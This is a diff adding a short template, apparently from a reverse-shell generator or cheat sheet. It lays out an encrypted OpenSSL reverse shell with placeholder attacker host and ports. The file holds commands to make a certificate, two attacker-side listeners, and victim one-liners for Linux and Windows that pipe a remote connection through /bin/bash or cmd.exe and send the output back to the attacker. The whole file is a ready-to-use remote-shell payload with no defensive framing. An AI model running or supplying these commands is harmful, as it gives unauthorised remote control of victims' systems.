@@ -1,0 +1,18 @@
+# desc: Attacker Generate certificate
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes 
+
+# desc: Attacker Command
+# Here you will be able to introduce the commands
+openssl s_server -quiet -key key.pem -cert cert.pem -port #{LPORT}
+
+# desc: Attacker Get Response
+#Here yo will be able to get the response
+openssl s_server -quiet -key key.pem -cert cert.pem -port #{lport_2}
+
+# desc: Victim Linux
+openssl s_client -quiet -connect #{LHOST}:#{LPORT}|/bin/bash|openssl s_client -quiet -connect #{LHOST}:#{lport_2}
+
+# desc: Victim Windows
+openssl.exe s_client -quiet -connect #{LHOST}:#{LPORT}|cmd.exe|openssl s_client -quiet -connect #{LHOST}:#{lport_2}
+
+@lport_2.desc(接收响应的端口)
